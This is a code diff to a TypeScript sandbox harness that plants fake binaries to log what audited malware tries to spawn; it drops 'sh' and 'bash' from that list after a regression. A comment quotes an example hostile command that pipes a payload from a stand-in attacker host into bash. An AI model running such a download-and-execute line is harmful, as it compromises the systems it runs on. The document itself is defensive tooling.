@@ -47,8 +47,15 @@ export interface PlantedFile {
  *  /workspace/spawn-log.txt so tests can assert on what the malware tried
  *  to spawn (e.g. `curl https://attacker.com/payload | bash`, `npm install -g X`).
  *  Without these, PROCESS_SPAWN findings end up TEST_UNCONFIRMED because
- *  the real binaries either fail (no network) or aren't present in the slim image. */
-const FAKE_BIN_NAMES = ["npm", "npx", "yarn", "pnpm", "bun", "curl", "wget", "git", "ssh", "scp", "bash", "sh"];
+ *  the real binaries either fail (no network) or aren't present in the slim image.
+ *
+ *  IMPORTANT: do NOT include `sh`, `bash`, `node`, or other binaries the test
+ *  harness itself depends on. Docker exec resolves command names via the
+ *  container PATH, so shadowing `sh` breaks `docker exec ... sh -c "..."` calls
+ *  (regression observed in v9.2: all early audits lost their TEST_CONFIRMED
+ *  because the npm install fallback and other shell ops invoked the fake `sh`
+ *  which just logs and exits). */
+const FAKE_BIN_NAMES = ["npm", "npx", "yarn", "pnpm", "bun", "curl", "wget", "git", "ssh", "scp"];
 
 function fakeBinaryScript(name: string): string {
   return `#!/bin/sh
